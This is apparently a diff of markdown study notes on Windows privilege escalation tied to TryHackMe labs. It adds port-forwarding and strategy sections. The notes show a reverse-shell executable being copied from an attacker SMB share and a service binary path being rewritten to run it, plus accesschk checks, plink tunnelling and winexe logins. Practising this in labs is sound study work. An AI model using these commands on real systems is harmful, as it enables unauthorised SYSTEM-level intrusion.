@@ -55,7 +55,6 @@ Saved as: reverse-shell.exe
 C:\Users\user> copy \\10.11.35.147\kali\reverse-shell.exe C:\PrivEsc\reverse-shell.exe
         1 file(s) copied.
 ```
-
 ___
 
 ## Tools
@@ -186,7 +185,7 @@ We can verify this with **accesschk.exe**:
 
 ```cmd
 C:\PrivEsc>.\accesschk.exe /accepteula -uwcqv user daclsvc 
-.\accesschk.exe /accepteula -uwcqv user daclsvc
+
 RW daclsvc
         SERVICE_QUERY_STATUS
         SERVICE_QUERY_CONFIG
@@ -237,7 +236,7 @@ In order to privesc, we can change the `BINARY_PATH_NAME` to our reverse shell p
 
 ```cmd
 C:\PrivEsc>sc config daclsvc binpath= "\"C:\PrivEsc\reverse-shell.exe\""
-sc config daclsvc binpath= "\"C:\PrivEsc\reverse-shell.exe\""
+
 [SC] ChangeServiceConfig SUCCESS
 C:\PrivEsc>net start daclsvc
 net start daclsvc
@@ -286,7 +285,7 @@ If we can write one of these files, we can execute a malicious program instead o
 
 ```powershell
 C:\PrivEsc>.\accesschk.exe /accepteula -ucqv user unquotedsvc 
-.\accesschk.exe /accepteula -ucqv user unquotedsvc
+
 R  unquotedsvc
         SERVICE_QUERY_STATUS
         SERVICE_QUERY_CONFIG
@@ -301,7 +300,7 @@ R  unquotedsvc
 
 ```cmd
 C:\PrivEsc>.\accesschk.exe /accepteula -uwdq "C:"
-.\accesschk.exe /accepteula -uwdq "C:"
+
 C:\PrivEsc
   Medium Mandatory Level (Default) [No-Write-Up]
   RW NT AUTHORITY\SYSTEM
@@ -404,7 +403,6 @@ Now let's query th service registry entry and check the current values:
 
 ```cmd
 C:\PrivEsc>reg query HKLM\System\CurrentControlSet\Services\regsvc
-reg query HKLM\System\CurrentControlSet\Services\regsvc
 
 HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\regsvc
     Type    REG_DWORD    0x10
@@ -1107,10 +1105,42 @@ PrintSpoofer is an exploit that targets the Print Spooler service.
 
 ___
 
+## Port Forwarding
+
+
+- Enable firewall on Windows:
+
+```cmd
+C:\> netsh advfirewall set allprofiles state on
+```
+
+- `plink.exe <user>@<kali> -R <kali-port>:127.0.0.1:<target-port>` (forward a port on Kali to an internal port on Windows?)
+
+- On Kali:
+
+```bash
+$ winexe-U '<user>%<pass>' //127.0.0.1 cmd.exe
+```
+
+___
+
+## Strategy
+
+1. Check user and group permissions
+2. Run enumeration tools like **winPEAS** (fast, searchfast and cmd options) or **Seabelt** as well as other scripts such as `PowerUp` or `SharUp`
+    + Look at service/registry exploits
+    + Enumerate admin processes and their versions
+    + Check Internal ports 
+3. Looks at some cheat sheets like [PayloadAllTheThings - Windows - Privilege Escalation](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#windows---privilege-escalation)
+4. Start to think about Kernel exploits
+
+___
+
 ## Resources
 
 - [THM - Windows PrivEsc](https://tryhackme.com/room/windows10privesc)
 - [THM - Windows PrivEsc Arena](https://tryhackme.com/room/windowsprivescarena)
+- [PayloadAllTheThings - Windows - Privilege Escalation](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#windows---privilege-escalation)
 - [THM - Post-Exploitation Basics](https://tryhackme.com/room/postexploit)
 - [THM - Attacking Kerberos](https://tryhackme.com/room/attackingkerberos)
 - [THM - ICE](https://tryhackme.com/room/ice)
